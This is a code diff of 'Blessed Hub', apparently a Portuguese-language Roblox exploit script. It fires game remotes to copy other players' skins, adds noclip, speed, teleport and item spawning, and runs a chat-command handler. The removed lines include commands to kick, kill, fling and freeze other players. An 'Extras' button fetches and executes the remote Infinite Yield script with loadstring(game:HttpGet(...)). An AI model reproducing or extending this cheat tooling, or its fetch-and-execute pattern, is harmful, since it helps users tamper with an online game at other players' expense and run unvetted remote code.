-    end
-end
-
-local function SetJumpHeight(val)
-    local hum = LocalPlayer.Character and LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
-    if hum then
-        hum.JumpHeight = tonumber(val) or 10
-        notify("Blessed Hub", "Pulo: " .. hum.JumpHeight, 3)
-    end
-end
-
-local function ResetCharacter()
-    local char = LocalPlayer.Character
-    if char and char:FindFirstChild("Humanoid") and char:FindFirstChild("HumanoidRootPart") then
-        local pos = char.HumanoidRootPart.Position
-        LocalPlayer.CharacterAdded:Once(function(newChar)
-            newChar:WaitForChild("HumanoidRootPart")
-            repeat task.wait() until newChar:FindFirstChild("Humanoid") and newChar.Humanoid.Health > 0
-            task.wait(0.1)
-            newChar.HumanoidRootPart.CFrame = CFrame.new(pos)
-        end)
-        char.Humanoid.Health = 0
-    else
-        notify("Blessed Hub", "Erro ao resetar personagem.", 3)
-    end
-end
-
-local function StartColorChange()
-    task.spawn(function()
-        while ColorChangeActive do
-            if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("Humanoid") then
-                local newColor = Color3.new(math.random(), math.random(), math.random())
-                local args = {
-                    [1] = {
-                        ["BodyColor"] = {
-                            ["HeadColor"] = newColor, ["TorsoColor"] = newColor, ["LeftArmColor"] = newColor,
-                            ["RightArmColor"] = newColor, ["LeftLegColor"] = newColor, ["RightLegColor"] = newColor
-                        }
-                    }
-                }
-                ReplicatedStorage.BloxbizRemotes.CatalogOnApplyToRealHumanoid:FireServer(unpack(args))
-            end
-            task.wait(0.1)
-        end
-    end)
-end
-
-local function Rejoin()
-    TeleportService:TeleportToPlaceInstance(game.PlaceId, game.JobId, LocalPlayer)
-end
-
-local function ViewPlayer(playerName)
-    local target = FindPlayer(playerName)
-    if target and target.Character then
-        local humanoid = target.Character:FindFirstChildOfClass("Humanoid")
-        if humanoid then
-            workspace.CurrentCamera.CameraSubject = humanoid
-            notify("Blessed Hub", "Visualizando: " .. target.Name, 3)
-        end
-    else
-        notify("Blessed Hub", "Jogador não encontrado.", 3)
-    end
-end
-
-local function UnviewPlayer()
-    local char = LocalPlayer.Character
-    if char then
-        local humanoid = char:FindFirstChildOfClass("Humanoid")
-        if humanoid then
-            workspace.CurrentCamera.CameraSubject = humanoid
-            notify("Blessed Hub", "Parou de visualizar outros jogadores.", 3)
-        end
-    end
-end
-
-local function StartLoopReset()
-    if loopResetActive then return end
-    loopResetActive = true
-    notify("Loop Reset", "Loop de reset ativado!", 3)
-    loopResetThread = task.spawn(function()
-        while loopResetActive do
-            if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("Humanoid") then
-                LocalPlayer.Character.Humanoid.Health = 0
-            end
-            task.wait(0.5)
-        end
-    end)
-end
-
-local function StopLoopReset()
-    if not loopResetActive then return end
-    loopResetActive = false
-    notify("Loop Reset", "Loop de reset desativado!", 3)
-end
-
--- Lista de comandos para o ;cmds
-local commandsList = {
-    ";copy [jogador] - Copia a skin do jogador (apenas usuários Blessed).",
-    ";tp [jogador] - Teleporta até o jogador (apenas usuários Blessed).",
-    ";bring [jogador] - Puxa o jogador até você (apenas usuários Blessed).",
-    ";kick [jogador] - Remove o jogador do servidor (apenas usuários Blessed).",
-    ";kill [jogador] - Mata o jogador (apenas usuários Blessed).",
-    ";killplus [jogador] - Mata o jogador com efeitos (apenas usuários Blessed).",
-    ";fling [jogador] - Arremessa o jogador para longe (apenas usuários Blessed).",
-    ";freeze [jogador] - Congela o jogador (apenas usuários Blessed).",
-    ";ws [valor] - Define velocidade.",
-    ";rews - Velocidade padrão (16).",
-    ";jp [valor] - Define pulo.",
-    ";rejp - Pulo padrão (10).",
-    ";re - Reseta skin.",
-    ";reset - Reinicia personagem no local da morte.",
-    ";autocolor_on - Cor automática ativada.",
-    ";autocolor_off - Cor automática desativada.",
-    ";rejoin - Reentra no servidor.",
-    ";view [jogador] - Visualiza jogador.",
-    ";unview - Para de visualizar.",
-    ";spawn - Salva posição atual como spawn.",
-    ";remove_spawn - Remove spawn salvo.",
-    ";loop-reset - Ativa loop de reset.",
-    ";unloop-reset - Desativa loop de reset.",
-    ";unbanvc - Reentra no Voice Chat.",
-    ";cmds - Lista todos comandos."
-}
-
--- Função principal de comandos (ATIVADA AUTOMATICAMENTE)
-local function handleChatCommand(message)
-    local msg = message:lower()
-    local args = string.split(msg, " ")
-    local command = args[1]
-    local param = table.concat(args, " ", 2)
-
-    if command == ";copy" then
-        local target = FindPlayer(param)
-        if target and BLESSED_USERS[target.Name] then
-            CopyPlayerSkin(param)
-        else
-            notify("Erro", "Jogador não encontrado ou não é um usuário Blessed.", 3)
-        end
-    elseif command == ";tp" then
-        local target = FindPlayer(param)
-        if target and BLESSED_USERS[target.Name] then
-            TeleportToPlayer(param)
-        else
-            notify("Erro", "Jogador não encontrado ou não é um usuário Blessed.", 3)
-        end
-    elseif command == ";bring" then -- NOVO COMANDO
-        BringPlayer(param)
-    elseif command == ";kick" then -- NOVO COMANDO
-        Kick(param)
-    elseif command == ";kill" then -- NOVO COMANDO
-        Kill(param)
-    elseif command == ";killplus" then -- NOVO COMANDO
-        KillPlus(param)
-    elseif command == ";fling" then -- NOVO COMANDO
-        Fling(param)
-    elseif command == ";freeze" then -- NOVO COMANDO
-        Freeze(param)
-    elseif command == ";ws" then SetSpeed(param)
-    elseif command == ";rews" then SetSpeed(16)
-    elseif command == ";jp" then SetJumpHeight(param)
-    elseif command == ";rejp" then SetJumpHeight(10)
-    elseif command == ";re" then ResetSkin()
-    elseif command == ";reset" then ResetCharacter()
-    elseif command == ";autocolor_on" then if not ColorChangeActive then ColorChangeActive = true StartColorChange() notify("Blessed Hub", "Cor automática ativada.", 3) end
-    elseif command == ";autocolor_off" then ColorChangeActive = false notify("Blessed Hub", "Cor automática desativada.", 3)
-    elseif command == ";rejoin" then notify("Blessed Hub", "Reentrando no servidor...", 3) Rejoin()
-    elseif command == ";view" then ViewPlayer(param)
-    elseif command == ";unview" then UnviewPlayer()
-    elseif command == ";spawn" then
-        if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
-            savedSpawn = LocalPlayer.Character.HumanoidRootPart.CFrame
-            spawnEnabled = true
-            notify("Spawn", "Spawn salvo com sucesso!", 3)
-        end
-    elseif command == ";remove_spawn" then
-        savedSpawn = nil
-        spawnEnabled = false
-        notify("Spawn", "Spawn removido com sucesso!", 3)
-    elseif command == ";loop-reset" then StartLoopReset()
-    elseif command == ";unloop-reset" then StopLoopReset()
-    elseif command == ";unbanvc" then
-        local success, err = pcall(function() return VoiceChatService:JoinVoice() end)
-        if success then notify("Blessed Hub", "Você entrou no Voice Chat!", 3)
-        else notify("Blessed Hub", "Erro ao entrar no Voice Chat: " .. tostring(err), 3)
-        end
-    elseif command == ";cmds" then
-        notify("Comandos Disponíveis", table.concat(commandsList, "\n"), 15)
-    end
-end
-
--- Conecta o listener de chat assim que o script é executado (se for autorizado)
-if isAutorizado then
-    LocalPlayer.Chatted:Connect(handleChatCommand)
-end
-
--- =====================================================
--- 4. CRIAÇÃO DA INTERFACE (JANELA, ABAS E ELEMENTOS)
--- =====================================================
-
--- Carregamento da biblioteca WindUI
+-- Carrega a biblioteca WindUI
 local WindUI
 local success, result = pcall(function()
     return require("./src/init")
@@ -918,22 +288,304 @@ end
 
 WindUI = result
 
+-- Serviços do Roblox
+local Players = game:GetService("Players")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local Workspace = game:GetService("Workspace")
+local RunService = game:GetService("RunService")
+local TeleportService = game:GetService("TeleportService")
+local TextChatService = game:GetService("TextChatService")
+local HttpService = game:GetService("HttpService")
+local StarterGui = game:GetService("StarterGui")
+
+-- Objetos e Jogadores Locais
+local LocalPlayer = Players.LocalPlayer
+local Player = LocalPlayer
+local PlaceId = game.PlaceId
+
 -- Variáveis de Estado Globais
 local SelectedPlayer = nil
+local ColorChangeActive = false
 local AutoEquipSkins = false
 local SavedSkinName = ""
 local savedSkins = {}
+local noclip = false
+local currentSound = nil
+local SelectedTag = nil
 local respawnAtDeathPosition = false
 local jobId = nil
 
 -- IDs e Constantes
 local soundId = "rbxassetid://1836973601"
 
--- Criação da interface
+-- Função para notificar o usuário
+local function notify(title, content, duration)
+    pcall(function()
+        StarterGui:SetCore("ChatMakeSystemMessage", {
+            Text = "[Blessed Hub] " .. title .. ": " .. content;
+            Color = Color3.fromRGB(255, 100, 0);
+            Font = Enum.Font.SourceSansBold;
+            FontSize = Enum.FontSize.Size24;
+        })
+    end)
+    
+    -- Tenta usar a notificação do WindUI se disponível
+    if WindUI and WindUI.Notify then
+        pcall(function()
+            WindUI:Notify({
+                Title = title,
+                Content = content,
+                Duration = duration or 3
+            })
+        end)
+    end
+end
+
+-- =====================================================
+-- 2. FUNÇÕES PRINCIPAIS (LÓGICA DO SCRIPT)
+-- =====================================================
+
+-- --- Funções de Utilidade e Interface ---
+
+function playSound()
+    local sound = Instance.new("Sound")
+    sound.SoundId = soundId
+    sound.Parent = game.Workspace
+    sound:Play()
+end
+
+function GetDateTime()
+    local now = os.date("*t")
+    return string.format("%02d/%02d/%04d - %02d:%02d:%02d", now.day, now.month, now.year, now.hour, now.min, now.sec)
+end
+
+function GetPlayerByName(query)
+    for _, player in ipairs(Players:GetPlayers()) do
+        if player.Name:lower():sub(1, #query) == query:lower() or  
+           player.DisplayName:lower():sub(1, #query) == query:lower() then
+            return player
+        end
+    end
+    return nil
+end
+
+-- --- Funções do Jogador e Personagem ---
+
+function getHumanoid()
+    local character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
+    return character:WaitForChild("Humanoid")
+end
+
+function CopyPlayerSkin(player)
+    if player and player.Character and player.Character:FindFirstChild("Humanoid") then
+        local humanoidDescription = player.Character.Humanoid.HumanoidDescription
+        local args = {
+            [1] = humanoidDescription,
+            [2] = true
+        }
+        
+        -- Tenta encontrar o evento de diferentes maneiras
+        local event = nil
+        if ReplicatedStorage:FindFirstChild("Events") then
+            event = ReplicatedStorage.Events:FindFirstChild("TryBuy")
+            if event then
+                event = event:FindFirstChild("Try")
+            end
+        end
+        
+        if event then
+            event:FireServer(unpack(args))
+            notify("Sucesso", "Skin copiada de: " .. player.Name, 3)
+        else
+            notify("Erro", "Evento de compra de skin não encontrado", 3)
+        end
+    end
+end
+
+function GetEquippedSkinIDs()
+    local equippedIDs = {}
+    local character = LocalPlayer.Character
+    if not character then return equippedIDs end
+
+    for _, item in ipairs(character:GetChildren()) do
+        if item:IsA("Accessory") and item:FindFirstChild("Handle") then
+            local handle = item.Handle
+            local mesh = handle:FindFirstChildOfClass("SpecialMesh") or handle:FindFirstChildOfClass("Mesh")
+            if mesh and mesh.MeshId and mesh.MeshId ~= "" then
+                local accessoryId = mesh.MeshId:match("%d+")
+                table.insert(equippedIDs, "Acessório: " .. (accessoryId or "Sem ID") .. " (" .. item.Name .. ")")
+            else
+                table.insert(equippedIDs, "Acessório (Sem ID): " .. item.Name)
+            end
+        end
+    end
+
+    local shirt = character:FindFirstChildOfClass("Shirt")
+    if shirt and shirt.ShirtTemplate and shirt.ShirtTemplate ~= "" then
+        table.insert(equippedIDs, "Roupa (Camisa): " .. shirt.ShirtTemplate)
+    end
+
+    local pants = character:FindFirstChildOfClass("Pants")
+    if pants and pants.PantsTemplate and pants.PantsTemplate ~= "" then
+        table.insert(equippedIDs, "Roupa (Calça): " .. pants.PantsTemplate)
+    end
+
+    return equippedIDs
+end
+
+function ResetSkin()
+    -- Tenta encontrar o evento de diferentes maneiras
+    local event = nil
+    if ReplicatedStorage:FindFirstChild("Events") then
+        event = ReplicatedStorage.Events:FindFirstChild("Refresh")
+    end
+    
+    if event then
+        event:FireServer()
+        notify("Sucesso", "Skin reiniciada", 3)
+    else
+        notify("Erro", "Evento de refresh não encontrado", 3)
+    end
+end
+
+-- --- Funções de Teleporte ---
+
+function TeleportToPlayer(targetPlayer)
+    local myCharacter = LocalPlayer.Character
+    if targetPlayer and targetPlayer.Character and targetPlayer.Character:FindFirstChild("HumanoidRootPart") and myCharacter and myCharacter:FindFirstChild("HumanoidRootPart") then
+        myCharacter.HumanoidRootPart.CFrame = targetPlayer.Character.HumanoidRootPart.CFrame
+        notify("Teleportado", "Você foi teleportado para: " .. targetPlayer.Name, 5)
+    else
+        notify("Erro", "Não foi possível teleportar.", 5)
+    end
+end
+
+-- --- Funções de Música ---
+
+function playMusic(songID)
+    if currentSound then
+        currentSound:Destroy()
+        currentSound = nil
+    end
+    currentSound = Instance.new("Sound")
+    currentSound.Parent = game.Workspace
+    currentSound.SoundId = "rbxassetid://" .. songID
+    currentSound.Volume = 0.5
+    currentSound.Looped = false
+    currentSound:Play()
+    notify("Música", "Tocando música ID: " .. songID, 3)
+end
+
+function stopMusic()
+    if currentSound then
+        currentSound:Stop()
+        currentSound:Destroy()
+        currentSound = nil
+        notify("Música Parada", "A música foi parada.", 2)
+    end
+end
+
+-- Tag
+function ApplyTagToMessage(message)
+    local properties = Instance.new("TextChatMessageProperties")
+    if SelectedTag then
+        properties.PrefixText = "<font color='#ff8400'>" .. SelectedTag .. "</font> " .. message.PrefixText
+    else
+        properties.PrefixText = message.PrefixText
+    end
+    return properties
+end
+
+
+-- --- Funções de Itens ---
+
+function getItem(itemName, assetId)
+    local backpack = LocalPlayer:FindFirstChild("Backpack")
+    if backpack then
+        local success, item = pcall(function()
+            return game:GetObjects("rbxassetid://" .. assetId)[1]
+        end)
+        if success and item then
+            item.Parent = backpack
+            item.Name = itemName
+            notify("Item Obtido", "Você pegou " .. itemName .. "!", 3)
+        else
+            notify("Erro", "Este modelo pode estar indisponível: " .. itemName, 3)
+        end
+    else
+        notify("Erro", "Não foi possível pegar " .. itemName .. ".", 3)
+    end
+end
+
+-- --- Funções de Skin Pré-definidas ---
+
+function EquipSkinSapo()
+    local args = {
+        [1] = {
+            ["WalkAnimation"] = 0, ["Accessories"] = {}, ["RightLegColor"] = nil, ["MoodAnimation"] = 14618207727,
+            ["LeftLegColor"] = nil, ["JumpAnimation"] = 0, ["ProportionScale"] = 0, ["BodyTypeScale"] = 1,
+            ["ClimbAnimation"] = 0, ["LeftArmColor"] = nil, ["Face"] = 0, ["Pants"] = 0, ["RightArmColor"] = nil,
+            ["DepthScale"] = 1, ["WidthScale"] = 1, ["SwimAnimation"] = 0, ["RightArm"] = 17898082257,
+            ["GraphicTShirt"] = 0, ["Head"] = 17898084158, ["Shirt"] = 0, ["RightLeg"] = 17898082268,
+            ["RunAnimation"] = 0, ["Torso"] = 17898081687, ["FallAnimation"] = 0, ["TorsoColor"] = nil,
+            ["IdleAnimation"] = 0, ["LeftArm"] = 17898082237, ["HeadScale"] = 1, ["HeightScale"] = 1,
+            ["HeadColor"] = nil, ["LeftLeg"] = 17898081542
+        }
+    }
+    
+    local success = pcall(function()
+        local event = ReplicatedStorage:WaitForChild("BloxbizRemotes"):WaitForChild("CatalogOnApplyOutfit")
+        if event then
+            event:FireServer(unpack(args))
+            notify("Skin Equipada", "A skin 'Skin de sapo' foi equipada.", 5)
+        else
+            notify("Erro", "Evento de aplicação de skin não encontrado", 3)
+        end
+    end)
+    
+    if not success then
+        notify("Erro", "Falha ao equipar skin de sapo", 3)
+    end
+end
+
+function EquipSkinCapivara()
+    local args = {
+        [1] = {
+            ["WalkAnimation"] = 0, ["Accessories"] = {}, ["RightLegColor"] = nil, ["MoodAnimation"] = 14618207727,
+            ["LeftLegColor"] = nil, ["JumpAnimation"] = 0, ["ProportionScale"] = 0, ["BodyTypeScale"] = 1,
+            ["ClimbAnimation"] = 0, ["LeftArmColor"] = nil, ["Face"] = 0, ["Pants"] = 0, ["RightArmColor"] = nil,
+            ["DepthScale"] = 1, ["WidthScale"] = 1, ["SwimAnimation"] = 0, ["RightArm"] = 131681603005543,
+            ["GraphicTShirt"] = 0, ["Head"] = 109137349673343, ["Shirt"] = 0, ["RightLeg"] = 98454038846291,
+            ["RunAnimation"] = 0, ["Torso"] = 129341990941517, ["FallAnimation"] = 0, ["TorsoColor"] = nil,
+            ["IdleAnimation"] = 0, ["LeftArm"] = 107032747230578, ["HeadScale"] = 1, ["HeightScale"] = 1,
+            ["HeadColor"] = nil, ["LeftLeg"] = 93110795723782
+        }
+    }
+    
+    local success = pcall(function()
+        local event = ReplicatedStorage:WaitForChild("BloxbizRemotes"):WaitForChild("CatalogOnApplyOutfit")
+        if event then
+            event:FireServer(unpack(args))
+            notify("Skin Equipada", "A skin 'Skin de capivara' foi equipada.", 5)
+        else
+            notify("Erro", "Evento de aplicação de skin não encontrado", 3)
+        end
+    end)
+    
+    if not success then
+        notify("Erro", "Falha ao equipar skin de capivara", 3)
+    end
+end
+
+-- =====================================================
+-- 3. CRIAÇÃO DA INTERFACE (JANELA, ABAS E ELEMENTOS)
+-- =====================================================
+
+-- Tentativa de criar a janela com tratamento de erros
 local Window
 local success, err = pcall(function()
     Window = WindUI:CreateWindow({
-        Title = "Blessed Hub | " .. (isDono and "Dono" or isMod and "Moderador" or "Usuário"),
+        Title = "Blessed Hub | Elite",
         Icon = "crown",
         Author = "Gab Scripts",
         Folder = "CloudHub",
@@ -945,7 +597,7 @@ local success, err = pcall(function()
         HasOutline = false,
         KeySystem = { 
             Key = { "1234", "5678" },
-            Note = "The Key is '1234' or '5678'",
+            Note = "A senha é '1234' ou '5678'",
             Thumbnail = { Image = "rbxassetid://110674298351147", Title = "Blessed Hub" },
             URL = "https://github.com/Footagesus/WindUI",
             SaveKey = true,
@@ -967,7 +619,8 @@ if not success then
     return
 end
 
--- Criação das abas
+-- --- Criação das Abas ---
+
 local CreditTab = Window:Tab({ Title = "Creditos", Icon = "info" })
 local MainTab = Window:Tab({ Title = "Inicio", Icon = "house" })
 local PlayerTab = Window:Tab({ Title = "Player", Icon = "user" })
@@ -981,20 +634,16 @@ local MusicTab = Window:Tab({ Title = "Musica", Icon = "music" })
 local ParceirosTab = Window:Tab({ Title = "Parceiros", Icon = "users" })
 local TagTab = Window:Tab({ Title = "Tags", Icon = "tag" })
 local ItemTab = Window:Tab({ Title = "Item", Icon = "backpack" })
+local AdminTab = Window:Tab({ Title = "Admin", Icon = "hammer" })
 local WindowTab = Window:Tab({ Title = "Settings", Icon = "settings" })
 local ExtraTab = Window:Tab({ Title = "Extras", Icon = "grid" })
--- Aba de Admin (apenas para donos e moderadores)
-local AdminTab
-if isAutorizado then
-    AdminTab = Window:Tab({ Title = "Admin", Icon = "hammer" })
-end
 
 Window:SelectTab(1)
 
--- Conteúdo das Abas (mantido do código original para não ficar extenso demais)
+-- --- Conteúdo das Abas ---
+
 -- [Creditos Tab]
 CreditTab:Section({ Title = "Bem-vindo ao Blessed Hub, " .. LocalPlayer.DisplayName .. "!", TextSize = 20 })
-CreditTab:Section({ Title = "Seu status: " .. (isDono and "Dono" or isMod and "Moderador" or "Usuário"), TextSize = 18 })
 local TimeSection = CreditTab:Section({ Title = "Data e Hora", TextSize = 18 })
 task.spawn(function()
     while true do
@@ -1121,6 +770,7 @@ PlayerTab:Toggle({ Title = "Noclip", Value = false, Callback = function(state)
     noclip = state
     notify("Noclip", state and "Ativado" or "Desativado", 5)
 end})
+
 -- 🟩 Serviços
 local UserInputService = game:GetService("UserInputService")
 local Players = game:GetService("Players")
@@ -1746,35 +1396,263 @@ ItemTab:Button({ Title = "Pegar Celular", Callback = function()
     getItem("Celular", "2143355240") 
 end})
 
--- [Admin Tab] - Apenas para donos e moderadores (SEM BOTÕES DE DONO)
-if isAutorizado and AdminTab then
-    AdminTab:Section({ Title = "Comandos de Admin via Chat", TextSize = 18 })
-    AdminTab:Label({ Title = "Os comandos já estão ATIVADOS.", TextSize = 14 })
-    AdminTab:Label({ Title = "Digite ;cmds no chat para ver a lista.", TextSize = 14 })
-    AdminTab:Button({ Title = "Ver Comandos Disponíveis", Description = "Lista todos os comandos que você pode usar no chat.", Callback = function()
-        notify("Comandos Disponíveis", table.concat(commandsList, "\n"), 15)
-    end})
+-- [Admin Tab]
+-- --- Funções de Comandos (Admin) ---
+
+local Players = game:GetService("Players")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local TeleportService = game:GetService("TeleportService")
+local VoiceChatService = game:GetService("VoiceChatService")
+local LocalPlayer = Players.LocalPlayer
+
+local respawnAtDeathPosition = false
+local ColorChangeActive = false
+local savedSpawn = nil
+local spawnEnabled = false
+local loopResetActive = false
+local loopResetThread = nil
+
+local commandsList = {
+";copy [jogador] - Copia a skin do jogador.",
+";tp [jogador] - Teleporta até o jogador.",
+";ws [valor] - Define velocidade.",
+";rews - Velocidade padrão (16).",
+";jp [valor] - Define pulo.",
+";rejp - Pulo padrão (10).",
+";re - Reseta skin.",
+";reset - Reinicia personagem no local da morte.",
+";autocolor_on - Cor automática ativada.",
+";autocolor_off - Cor automática desativada.",
+";rejoin - Reentra no servidor.",
+";view [jogador] - Visualiza jogador.",
+";unview - Para de visualizar.",
+";spawn - Salva posição atual como spawn.",
+";remove_spawn - Remove spawn salvo.",
+";loop-reset - Ativa loop de reset.",
+";unloop-reset - Desativa loop de reset.",
+";unbanvc - Reentra no Voice Chat.",
+";cmds - Lista todos comandos."
+}
+
+-- Função para achar jogador por nome ou display name
+local function FindPlayer(name)
+for _, p in ipairs(Players:GetPlayers()) do
+if p.Name:lower():sub(1, #name) == name:lower() or p.DisplayName:lower():sub(1, #name) == name:lower() then
+return p
+end
+end
 end
 
+-- Funções principais
+local function CopySkin(name)
+local target = FindPlayer(name)
+if target and target.Character and target.Character:FindFirstChild("Humanoid") then
+local args = { target.Character.Humanoid.HumanoidDescription, true }
+ReplicatedStorage.Events.TryBuy.Try:FireServer(unpack(args))
+notify("Blessed Hub", "Skin copiada de: " .. target.Name, 3)
+else
+notify("Blessed Hub", "Jogador não encontrado.", 3)
+end
+end
+
+local function TeleportToPlayer(name)
+local target = FindPlayer(name)
+local myChar = LocalPlayer.Character
+if target and target.Character and myChar then
+local tHRP = target.Character:FindFirstChild("HumanoidRootPart")
+local myHRP = myChar:FindFirstChild("HumanoidRootPart")
+if tHRP and myHRP then
+myHRP.CFrame = tHRP.CFrame
+notify("Blessed Hub", "Teleportado para: " .. target.Name, 3)
+end
+end
+end
+
+local function SetSpeed(val)
+local hum = LocalPlayer.Character and LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
+if hum then
+hum.WalkSpeed = tonumber(val) or 16
+notify("Blessed Hub", "Velocidade: " .. hum.WalkSpeed, 3)
+end
+end
+
+local function SetJumpHeight(val)
+local hum = LocalPlayer.Character and LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
+if hum then
+hum.JumpHeight = tonumber(val) or 10
+notify("Blessed Hub", "Pulo: " .. hum.JumpHeight, 3)
+end
+end
+
+local function ResetSkin()
+ReplicatedStorage:WaitForChild("Events"):WaitForChild("Refresh"):FireServer()
+notify("Blessed Hub", "Skin reiniciada.", 3)
+end
+
+local function ResetCharacter()
+local char = LocalPlayer.Character
+if char and char:FindFirstChild("Humanoid") and char:FindFirstChild("HumanoidRootPart") then
+local pos = char.HumanoidRootPart.Position
+respawnAtDeathPosition = true
+LocalPlayer.CharacterAdded:Once(function(newChar)
+newChar:WaitForChild("HumanoidRootPart")
+repeat task.wait() until newChar:FindFirstChild("Humanoid") and newChar.Humanoid.Health > 0
+if respawnAtDeathPosition then
+task.wait(0.1)
+newChar.HumanoidRootPart.CFrame = CFrame.new(pos)
+respawnAtDeathPosition = false
+end
+end)
+char.Humanoid.Health = 0
+else
+notify("Blessed Hub", "Erro ao resetar personagem.", 3)
+end
+end
+
+local function StartColorChange()
+task.spawn(function()
+while ColorChangeActive do
+if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("Humanoid") then
+local newColor = Color3.new(math.random(), math.random(), math.random())
+local args = {
+[1] = {
+["BodyColor"] = {
+["HeadColor"] = newColor,
+["TorsoColor"] = newColor,
+["LeftArmColor"] = newColor,
+["RightArmColor"] = newColor,
+["LeftLegColor"] = newColor,
+["RightLegColor"] = newColor
+}
+}
+}
+ReplicatedStorage.BloxbizRemotes.CatalogOnApplyToRealHumanoid:FireServer(unpack(args))
+end
+task.wait(0.1)
+end
+end)
+end
+
+local function Rejoin()
+TeleportService:TeleportToPlaceInstance(game.PlaceId, game.JobId, LocalPlayer)
+end
+
+local function ViewPlayer(playerName)
+local target = FindPlayer(playerName)
+if target and target.Character then
+local humanoid = target.Character:FindFirstChildOfClass("Humanoid")
+if humanoid then
+workspace.CurrentCamera.CameraSubject = humanoid
+notify("Blessed Hub", "Visualizando: " .. target.Name, 3)
+end
+else
+notify("Blessed Hub", "Jogador não encontrado.", 3)
+end
+end
+
+local function UnviewPlayer()
+local char = LocalPlayer.Character
+if char then
+local humanoid = char:FindFirstChildOfClass("Humanoid")
+if humanoid then
+workspace.CurrentCamera.CameraSubject = humanoid
+notify("Blessed Hub", "Parou de visualizar outros jogadores.", 3)
+end
+end
+end
+
+local function StartLoopReset()
+if loopResetActive then return end
+loopResetActive = true
+notify("Loop Reset", "Loop de reset ativado!", 3)
+loopResetThread = task.spawn(function()
+while loopResetActive do
+if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("Humanoid") then
+LocalPlayer.Character.Humanoid.Health = 0
+end
+task.wait(0.5)
+end
+end)
+end
+
+local function StopLoopReset()
+if not loopResetActive then return end
+loopResetActive = false
+notify("Loop Reset", "Loop de reset desativado!", 3)
+end
+
+-- Função principal de comandos
+function handleChatCommand(message)
+local msg = message:lower()
+local args = string.split(msg, " ")
+local command = args[1]
+local param = table.concat(args, " ", 2)
+
+if command == ";copy" then CopySkin(param)
+elseif command == ";tp" then TeleportToPlayer(param)
+elseif command == ";ws" then SetSpeed(param)
+elseif command == ";rews" then SetSpeed(16)
+elseif command == ";jp" then SetJumpHeight(param)
+elseif command == ";rejp" then SetJumpHeight(10)
+elseif command == ";re" then ResetSkin()
+elseif command == ";reset" then ResetCharacter()
+elseif command == ";autocolor_on" then if not ColorChangeActive then ColorChangeActive = true StartColorChange() notify("Blessed Hub", "Cor automática ativada.", 3) end
+elseif command == ";autocolor_off" then ColorChangeActive = false notify("Blessed Hub", "Cor automática desativada.", 3)
+elseif command == ";rejoin" then notify("Blessed Hub", "Reentrando no servidor...", 3) Rejoin()
+elseif command == ";view" then ViewPlayer(param)
+elseif command == ";unview" then UnviewPlayer()
+elseif command == ";spawn" then
+if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
+savedSpawn = LocalPlayer.Character.HumanoidRootPart.CFrame
+spawnEnabled = true
+notify("Spawn", "Spawn salvo com sucesso!", 3)
+end
+elseif command == ";remove_spawn" then
+savedSpawn = nil
+spawnEnabled = false
+notify("Spawn", "Spawn removido com sucesso!", 3)
+elseif command == ";loop-reset" then StartLoopReset()
+elseif command == ";unloop-reset" then StopLoopReset()
+elseif command == ";unbanvc" then
+local success, err = pcall(function() return VoiceChatService:JoinVoice() end)
+if success then notify("Blessed Hub", "Você entrou no Voice Chat!", 3)
+else notify("Blessed Hub", "Erro ao entrar no Voice Chat: " .. tostring(err), 3)
+end
+elseif command == ";cmds" then
+notify("Comandos Disponíveis", table.concat(commandsList, "\n"), 15)
+end
+end
+
+-- // Evento para os comandos de chat (Admin)
+LocalPlayer.Chatted:Connect(handleChatCommand)
+
+-- Botões da Admin Tab
+AdminTab:Button({ Title = "Ativar Comandos ADM", Description = "Digite os comandos no chat, ex: ;copy nome", Callback = function()
+notify("Blessed Hub", "Comandos de ADM ativados! Digite ;cmds no chat para ver.", 2)
+end})
+AdminTab:Button({ Title = "Ver Comandos Disponíveis", Description = "Lista todos os comandos que você pode usar no chat.", Callback = function()
+notify("Comandos Disponíveis", table.concat(commandsList, "\n"), 15)
+end})
+
 -- [Settings/Window Tab]
-WindowTab:Button({ Title = "Relogar", Desc = "Clique aqui para relogar no jogo.", Callback = function()
-TeleportService:Teleport(PlaceId, Player)
+WindowTab:Button({ Title = "Relogar", Desc = "Clique aqui para relogar no jogo.", Callback = function() 
+    TeleportService:Teleport(PlaceId, Player) 
 end})
 
 -- [Extras Tab]
 ExtraTab:Button({ Title = "Executar Infinite Yield", Desc = "Clique para executar o script Infinite Yield.", Callback = function()
-local success, err = pcall(function()
-loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()
-end)
-if success then
-notify("Script Executado", "Infinite Yield foi executado com sucesso.", 5)
-else
-notify("Erro", "Falha ao executar o script: " .. tostring(err), 5)
-end
+    local success, err = pcall(function() 
+        loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))() 
+    end)
+    if success then 
+        notify("Script Executado", "Infinite Yield foi executado com sucesso.", 5)
+    else 
+        notify("Erro", "Falha ao executar o script: " .. tostring(err), 5) 
+    end
 end})
 
 -- =====================================================
--- 5. CONEXÕES DE EVENTOS E EXECUÇÃO INICIAL
+-- 4. CONEXÕES DE EVENTOS E EXECUÇÃO INICIAL
 -- =====================================================
 
 -- Evento para Noclip
@@ -1807,13 +1685,6 @@ end)
 
 -- Execução inicial do script
 pcall(function()
-    local sound = Instance.new("Sound")
-    sound.SoundId = soundId
-    sound.Parent = game.Workspace
-    sound:Play()
-    
-    notify("Blessed Hub", "Script carregado com sucesso! Seu status: " .. (isDono and "Dono" or isMod and "Moderador" or "Usuário"), 3)
-    
-    -- Aplica shaders automaticamente
-    applyShaders()
+    playSound()
+    notify("Blessed Hub", "Script carregado com sucesso!", 3)
 end)
